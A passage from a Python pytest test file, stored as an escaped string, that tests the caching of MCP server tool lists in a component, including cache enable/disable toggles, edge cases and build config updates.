cached\\n        servers_cache = safe_cache_get(component._shared_component_cache, \\\"servers\\\", {})\\n        assert cache_key in servers_cache\\n        cached_data = servers_cache[cache_key]\\n        assert len(cached_data[\\\"tools\\\"]) == 2\\n        assert cached_data[\\\"tool_names\\\"] == [\\\"test_tool\\\", \\\"second_tool\\\"]\\n\\n    @pytest.mark.asyncio\\n    async def test_cache_reuses_cached_tools(\\n        self, component_class, default_kwargs, mock_tools_list, mock_server_config\\n    ):\\n        \\\"\\\"\\\"Test that cached tools are reused on subsequent calls.\\\"\\\"\\\"\\n        component = await self.component_setup(component_class, default_kwargs)\\n        component.use_cache = True\\n        server_name = \\\"test_server\\\"\\n        cache_key = component._mcp_servers_cache_key(server_name)\\n\\n        # Pre-populate cache\\n        cache_data = {\\n            \\\"tools\\\": mock_tools_list,\\n            \\\"tool_names\\\": [\\\"test_tool\\\", \\\"second_tool\\\"],\\n            \\\"tool_cache\\\": {\\\"test_tool\\\": mock_tools_list[0]},\\n            \\\"config\\\": mock_server_config,\\n        }\\n        safe_cache_set(component._shared_component_cache, \\\"servers\\\", {cache_key: cache_data})\\n\\n        with patch(\\\"lfx.base.mcp.util.update_tools\\\") as mock_update_tools:\\n            # This should NOT be called if cache is working\\n            mock_update_tools.return_value = (None, [], {})\\n\\n            # Call should use cache without calling update_tools\\n            tools, server_info = await component.update_tool_list(server_name)\\n\\n            # Verify cached tools were returned\\n            assert len(tools) == 2\\n            assert tools[0].name == \\\"test_tool\\\"\\n            assert tools[1].name == \\\"second_tool\\\"\\n            assert server_info[\\\"name\\\"] == server_name\\n            assert server_info[\\\"config\\\"] == mock_server_config\\n\\n            # Verify update_tools was NOT called (cache was used)\\n            mock_update_tools.assert_not_called()\\n\\n    # ========================================\\n    # Cache Disabled Tests\\n    # ========================================\\n\\n    @pytest.mark.asyncio\\n    async def test_cache_disabled_logic(self, component_class, default_kwargs):\\n        \\\"\\\"\\\"Test the cache disabled logic by verifying cache settings and behavior.\\\"\\\"\\\"\\n        component = await self.component_setup(component_class, default_kwargs)\\n        component.use_cache = False\\n        server_name = \\\"test_server\\\"\\n\\n        # Pre-populate cache to verify it would be ignored\\n        cache_data = {\\n            \\\"tools\\\": [MagicMock(name=\\\"old_cached_tool\\\")],\\n            \\\"tool_names\\\": [\\\"old_cached_tool\\\"],\\n            \\\"tool_cache\\\": {},\\n            \\\"config\\\": {\\\"old\\\": \\\"config\\\"},\\n        }\\n        safe_cache_set(component._shared_component_cache, \\\"servers\\\", {server_name: cache_data})\\n\\n        # Test the cache logic directly\\n        use_cache = getattr(component, \\\"use_cache\\\", True)\\n        assert use_cache is False\\n\\n        # When cache is disabled, the cache lookup logic should be skipped\\n        cached = None\\n        if use_cache:\\n            servers_cache = safe_cache_get(component._shared_component_cache, \\\"servers\\\", {})\\n            cached = servers_cache.get(server_name) if isinstance(servers_cache, dict) else None\\n\\n        # Since use_cache is False, cached should remain None\\n        assert cached is None\\n\\n        # Verify the cache data still exists (it's just ignored)\\n        servers_cache = safe_cache_get(component._shared_component_cache, \\\"servers\\\", {})\\n        assert server_name in servers_cache\\n        assert servers_cache[server_name][\\\"tool_names\\\"] == [\\\"old_cached_tool\\\"]\\n\\n    @pytest.mark.asyncio\\n    async def test_cache_disabled_doesnt_store_tools(self, component_class, default_kwargs):\\n        \\\"\\\"\\\"Test that tools are not stored in cache when cache is disabled.\\\"\\\"\\\"\\n        component = await self.component_setup(component_class, default_kwargs)\\n        component.use_cache = False\\n        server_name = \\\"test_server_fresh\\\"  # Use different name to avoid conflicts\\n\\n        # Clear any existing cache first\\n        safe_cache_set(component._shared_component_cache, \\\"servers\\\", {})\\n\\n        # Simulate the caching logic when use_cache is False\\n        use_cache = getattr(component, \\\"use_cache\\\", True)\\n        mock_tools = [MagicMock(name=\\\"fresh_tool\\\")]\\n\\n        # The caching code that would normally run\\n        if use_cache:\\n            cache_data = {\\n                \\\"tools\\\": mock_tools,\\n                \\\"tool_names\\\": [\\\"fresh_tool\\\"],\\n                \\\"tool_cache\\\": {\\\"fresh_tool\\\": mock_tools[0]},\\n                \\\"config\\\": {\\\"command\\\": \\\"test\\\"},\\n            }\\n            current_servers_cache = safe_cache_get(component._shared_component_cache, \\\"servers\\\", {})\\n            current_servers_cache[server_name] = cache_data\\n            safe_cache_set(component._shared_component_cache, \\\"servers\\\", current_servers_cache)\\n\\n        # Since use_cache is False, nothing should be cached\\n        servers_cache = safe_cache_get(component._shared_component_cache, \\\"servers\\\", {})\\n        assert server_name not in servers_cache\\n\\n    # ========================================\\n    # Cache Toggle Tests\\n    # ========================================\\n\\n    @pytest.mark.asyncio\\n    async def test_switching_from_cache_enabled_to_disabled(\\n        self, component_class, default_kwargs, mock_tools_list, mock_server_config\\n    ):\\n        \\\"\\\"\\\"Test switching from cache enabled to disabled by testing cache logic directly.\\\"\\\"\\\"\\n        component = await self.component_setup(component_class, default_kwargs)\\n        server_name = \\\"test_server\\\"\\n\\n        # Start with cache enabled\\n        component.use_cache = True\\n\\n        # Pre-populate cache\\n        cache_data = {\\n            \\\"tools\\\": mock_tools_list,\\n            \\\"tool_names\\\": [\\\"test_tool\\\", \\\"second_tool\\\"],\\n            \\\"tool_cache\\\": {\\\"test_tool\\\": mock_tools_list[0]},\\n            \\\"config\\\": mock_server_config,\\n        }\\n        safe_cache_set(component._shared_component_cache, \\\"servers\\\", {server_name: cache_data})\\n\\n        # Test cache logic directly - first verify cache would be used\\n        use_cache = getattr(component, \\\"use_cache\\\", True)\\n        assert use_cache is True\\n\\n        servers_cache = safe_cache_get(component._shared_component_cache, \\\"servers\\\", {})\\n        cached = servers_cache.get(server_name) if isinstance(servers_cache, dict) else None\\n        assert cached is not None\\n        assert len(cached[\\\"tools\\\"]) == 2\\n\\n        # Switch to cache disabled\\n        component.use_cache = False\\n\\n        # Test that cache lookup would now be skipped\\n        use_cache = getattr(component, \\\"use_cache\\\", True)\\n        assert use_cache is False\\n\\n        # When cache is disabled, the cache lookup logic should be skipped\\n        cached = None\\n        if use_cache:\\n            servers_cache = safe_cache_get(component._shared_component_cache, \\\"servers\\\", {})\\n            cached = servers_cache.get(server_name) if isinstance(servers_cache, dict) else None\\n\\n        # Since use_cache is False, cached should remain None (cache was not looked up)\\n        assert cached is None\\n\\n        # Verify the cache data still exists but would be ignored\\n        servers_cache = safe_cache_get(component._shared_component_cache, \\\"servers\\\", {})\\n        assert server_name in servers_cache\\n        assert len(servers_cache[server_name][\\\"tools\\\"]) == 2\\n\\n    @pytest.mark.asyncio\\n    async def test_switching_from_cache_disabled_to_enabled(\\n        self, component_class, default_kwargs, mock_tools_list, mock_server_config\\n    ):\\n        \\\"\\\"\\\"Test switching from cache disabled to enabled by testing cache logic directly.\\\"\\\"\\\"\\n        component = await self.component_setup(component_class, default_kwargs)\\n        server_name = \\\"test_server\\\"\\n\\n        # Start with cache disabled\\n        component.use_cache = False\\n\\n        # Test that cache lookup would be skipped\\n        use_cache = getattr(component, \\\"use_cache\\\", True)\\n        assert use_cache is False\\n\\n        # When cache is disabled, the cache lookup logic should be skipped\\n        cached = None\\n        if use_cache:\\n            servers_cache = safe_cache_get(component._shared_component_cache, \\\"servers\\\", {})\\n            cached = servers_cache.get(server_name) if isinstance(servers_cache, dict) else None\\n\\n        # Since use_cache is False, cached should remain None\\n        assert cached is None\\n\\n        # Switch to cache enabled\\n        component.use_cache = True\\n\\n        # Test that cache would now be used if available\\n        use_cache = getattr(component, \\\"use_cache\\\", True)\\n        assert use_cache is True\\n\\n        # Pre-populate cache to test retrieval\\n        cache_data = {\\n            \\\"tools\\\": mock_tools_list,\\n            \\\"tool_names\\\": [\\\"test_tool\\\", \\\"second_tool\\\"],\\n            \\\"tool_cache\\\": {\\\"test_tool\\\": mock_tools_list[0]},\\n            \\\"config\\\": mock_server_config,\\n        }\\n        safe_cache_set(component._shared_component_cache, \\\"servers\\\", {server_name: cache_data})\\n\\n        # Now cache should be retrieved when enabled\\n        if use_cache:\\n            servers_cache = safe_cache_get(component._shared_component_cache, \\\"servers\\\", {})\\n            cached = servers_cache.get(server_name) if isinstance(servers_cache, dict) else None\\n\\n        assert cached is not None\\n        assert len(cached[\\\"tools\\\"]) == 2\\n        assert cached[\\\"tool_names\\\"] == [\\\"test_tool\\\", \\\"second_tool\\\"]\\n\\n    # ========================================\\n    # Edge Cases Tests\\n    # ========================================\\n\\n    @pytest.mark.asyncio\\n    async def test_cache_with_empty_server_name(self, component_class, default_kwargs):\\n        \\\"\\\"\\\"Test cache behavior with empty server name.\\\"\\\"\\\"\\n        component = await self.component_setup(component_class, default_kwargs)\\n        component.use_cache = True\\n\\n        tools, server_info = await component.update_tool_list(\\\"\\\")\\n\\n        # Should return empty tools and empty server info\\n        assert tools == []\\n        assert server_info[\\\"name\\\"] == \\\"\\\"\\n        assert server_info[\\\"config\\\"] is None\\n\\n    @pytest.mark.asyncio\\n    async def test_cache_with_none_server(self, component_class, default_kwargs):\\n        \\\"\\\"\\\"Test cache behavior with None server.\\\"\\\"\\\"\\n        component = await self.component_setup(component_class, default_kwargs)\\n        component.use_cache = True\\n        # Clear any existing mcp_server from component to ensure None handling\\n        component.mcp_server = None\\n\\n        tools, server_info = await component.update_tool_list(None)\\n\\n        # Should return empty tools and None server info\\n        assert tools == []\\n        assert server_info[\\\"name\\\"] is None\\n        assert server_info[\\\"config\\\"] is None\\n\\n    @pytest.mark.asyncio\\n    async def test_cache_with_corrupted_cache_data(self, component_class, default_kwargs):\\n        \\\"\\\"\\\"Test behavior when cache contains invalid data.\\\"\\\"\\\"\\n        component = await self.component_setup(component_class, default_kwargs)\\n        component.use_cache = True\\n        server_name = \\\"test_server\\\"\\n\\n        # Set invalid cache data (string instead of dict)\\n        safe_cache_set(component._shared_component_cache, \\\"servers\\\", {server_name: \\\"invalid_data\\\"})\\n\\n        # Test that corrupted cache is handled gracefully by trying to access the cache directly\\n        # This simulates what happens in the component when cache data is corrupted\\n        servers_cache = safe_cache_get(component._shared_component_cache, \\\"servers\\\", {})\\n        cached = servers_cache.get(server_name) if isinstance(servers_cache, dict) else None\\n\\n        # Cached should be the invalid data\\n        assert cached == \\\"invalid_data\\\"\\n\\n        # Now test that when we try to access it like a dict, we get the expected error\\n        # and the component handles it gracefully\\n        with pytest.raises(TypeError):\\n            # This should fail because we can't do \\\"string\\\"[\\\"tools\\\"]\\n            _ = cached[\\\"tools\\\"]\\n\\n        # Verify that the cache can be cleared\\n        current_servers_cache = safe_cache_get(component._shared_component_cache, \\\"servers\\\", {})\\n        if isinstance(current_servers_cache, dict) and server_name in current_servers_cache:\\n            current_servers_cache.pop(server_name)\\n            safe_cache_set(component._shared_component_cache, \\\"servers\\\", current_servers_cache)\\n\\n        # Verify cache is now cleared\\n        servers_cache = safe_cache_get(component._shared_component_cache, \\\"servers\\\", {})\\n        assert server_name not in servers_cache\\n\\n    @pytest.mark.asyncio\\n    async def test_cache_persistence_across_instances(\\n        self, component_class, default_kwargs, mock_tools_list, mock_server_config\\n    ):\\n        \\\"\\\"\\\"Test that cache persists across component instances.\\\"\\\"\\\"\\n        server_name = \\\"test_server\\\"\\n        shared_tenant_id = str(uuid4())\\n\\n        # First component instance\\n        component1 = await self.component_setup(component_class, default_kwargs)\\n        component1._user_id = shared_tenant_id\\n        component1.use_cache = True\\n        cache_key = component1._mcp_servers_cache_key(server_name)\\n\\n        # Cache some data\\n        cache_data = {\\n            \\\"tools\\\": mock_tools_list,\\n            \\\"tool_names\\\": [\\\"test_tool\\\", \\\"second_tool\\\"],\\n            \\\"tool_cache\\\": {\\\"test_tool\\\": mock_tools_list[0]},\\n            \\\"config\\\": mock_server_config,\\n        }\\n        safe_cache_set(component1._shared_component_cache, \\\"servers\\\", {cache_key: cache_data})\\n\\n        # Second component instance\\n        component2 = await self.component_setup(component_class, default_kwargs)\\n        component2._user_id = shared_tenant_id\\n        component2.use_cache = True\\n\\n        # Should access the same cache\\n        tools, _ = await component2.update_tool_list(server_name)\\n\\n        # Should get cached tools without making external calls\\n        assert len(tools) == 2\\n        assert tools[0].name == \\\"test_tool\\\"\\n\\n    # ========================================\\n    # Build Config Caching Tests\\n    # ========================================\\n\\n    @pytest.mark.asyncio\\n    async def test_build_config_respects_cache_setting(self, component_class, default_kwargs, mock_tools_list):\\n        \\\"\\\"\\\"Test that build config updates respect cache settings.\\\"\\\"\\\"\\n        component = await self.component_setup(component_class, default_kwargs)\\n        component.use_cache = True\\n        server_name = \\\"test_server\\\"\\n        cache_key = component._mcp_servers_cache_key(server_name)\\n\\n        # Pre-populate cache\\n        cache_data = {\\n            \\\"tools\\\": mock_tools_list,\\n            \\\"tool_names\\\": [\\\"test_tool\\\", \\\"second_tool\\\"],\\n            \\\"tool_cache\\\": {\\\"test_tool\\\": mock_tools_list[0]},\\n            \\\"config\\\": {\\\"command\\\": \\\"test\\\"},\\n        }\\n        safe_cache_set(component._shared_component_cache, \\\"servers\\\", {cache_key: cache_data})\\n\\n        build_config = {\\n            \\\"mcp_server\\\": {\\\"value\\\": {\\\"name\\\": server_name}},\\n            \\\"tool\\\": {\\\"show\\\": False, \\\"options\\\": [], \\\"placeholder\\\": \\\"\\\"},\\n            \\\"tool_placeholder\\\": {\\\"tool_mode\\\": False},\\n            \\\"tools_metadata\\\": {\\\"show\\\": False},\\n        }\\n\\n        # Update build config - should use cached tools\\n        updated_config = await component.update_build_config(build_config, {\\\"name\\\": server_name}, \\\"mcp_server\\\")\\n\\n        # Should show cached tools in dropdown\\n        assert updated_config[\\\"tool\\\"][\\\"show\\\"] is True\\n        assert len(updated_config[\\\"tool\\\"][\\\"options\\\"]) == 2\\n        assert \\\"test_tool\\\" in updated_config[\\\"tool\\\"][\\\"options\\\"]\\n        assert \\\"second_tool\\\" in updated_config[\\\"tool\\\"][\\\"options\\\"]\\n\\n    @pytest.mark.asyncio\\n    async def test_unauthenticated_build_config_skips_shared_servers_cache(self, component_class, default_kwargs):\\n        component = await self.component_setup(component_class, default_kwargs)\\n        component._user_id = None\\n        component._vertex = None\\n        component.use_cache = True\\n        assert component._mcp_cache_user_id() is None\\n\\n        server_name = \\\"test_server\\\"\\n        cache_key = component._mcp_servers_cache_key(server_name)\\n        cached_tool = MagicMock()\\n        cached_tool.name = \\\"cached_tool\\\"\\n        cached_entry = {\\n            \\\"tools\\\": [cached_tool],\\n            \\\"tool_names\\\": [cached_tool.name],\\n            \\\"tool_cache\\\": {cached_tool.name: cached_tool},\\n            \\\"config\\\": {\\\"command\\\": \\\"cached\\\"},\\n        }\\n        servers_cache = {cache_key: cached_entry}\\n        safe_cache_set(component._shared_component_cache, \\\"servers\\\", servers_cache)\\n        safe_cache_set(component._shared_component_cache, \\\"last_selected_server\\\", \\\"\\\")\\n\\n        fresh_tool = MagicMock()\\n        fresh_tool.name = \\\"fresh_tool\\\"\\n        fresh_server = {\\\"name\\\": server_name, \\\"config\\\": {\\\"command\\\": \\\"fresh\\\"}}\\n        build_config = {\\n            \\\"mcp_server\\\": {\\\"value\\\": {\\\"name\\\": server_name}},\\n            \\\"tool\\\": {\\\"show\\\": False, \\\"options\\\": [], \\\"placeholder\\\": \\\"\\\"},\\n            \\\"tool_placeholder\\\": {\\\"tool_mode\\\": False},\\n            \\\"tools_metadata\\\": {\\\"show\\\": False},\\n        }\\n\\n        with patch.object(\\n            component,\\n            \\\"update_tool_list\\\",\\n            AsyncMock(return_value=([fresh_tool], fresh_server)),\\n        ) as update:\\n            updated_config = await component.update_build_config(build_config, {\\\"name\\\": server_name}, \\\"mcp_server\\\")\\n\\n        update.assert_awaited_once_with(mcp_server_value={\\\"name\\\": server_name})\\n        assert updated_config[\\\"tool\\\"][\\\"options\\\"] == [fresh_tool.name]\\n        assert safe_cache_get(component._shared_component_cache, \\\"servers\\\", {}) == servers_cache\\n\\n    # ========================================\\n    # Integration Tests\\n    # ========================================\\n\\n    @pytest.mark.asyncio\\n    async def test_build_output_with_cached_tools(self, component_class, default_kwargs, mock_tools_list):\\n        \\\"\\\"\\\"Test build_output method works correctly with cached tools.\\\"\\\"\\\"\\n        component = await self.component_setup(component_class, default_kwargs)\\n        component.use_cache = True\\n        component.tool = \\\"test_tool\\\"\\n\\n        # Mock the execution tool\\n        exec_tool = MagicMock()\\n        exec_tool.coroutine = AsyncMock()\\n        mock_result = MagicMock()\\n        mock_result.isError = False\\n        mock_result.content = [MagicMock()]\\n        mock_result.content[0].model_dump.return_value = {\\\"result\\\": \\\"test_output\\\"}\\n        exec_tool.coroutine.return_value = mock_result\\n\\n        # Set up cached tools\\n        component.tools = mock_tools_list\\n        component._tool_cache = {\\\"test_tool\\\": exec_tool}\\n\\n        # Mock the method that gets tool args and update_tool_list to prevent calling real MCP\\n        with (\\n            patch.object(component, \\\"get_inputs_for_all_tools\\\") as mock_get_inputs,\\n            patch.object(component, \\\"update_tool_list\\\") as mock_update_tool_list,\\n        ):\\n            mock_get_inputs.return_value = {\\\"test_tool\\\": []}\\n            mock_update_tool_list.return_value = (mock_tools_list, {\\\"name\\\": \\\"test_server\\\", \\\"config\\\": {}})\\n\\n            # Build output should work with cached tools\\n            result = await component.build_output()\\n\\n            assert isinstance(result, DataFrame)\\n            # DataFrame is a pandas subclass, use to_dict to access data\\n            result_dict = result.to_dict(orient=\\\"records\\\")\\n     ";
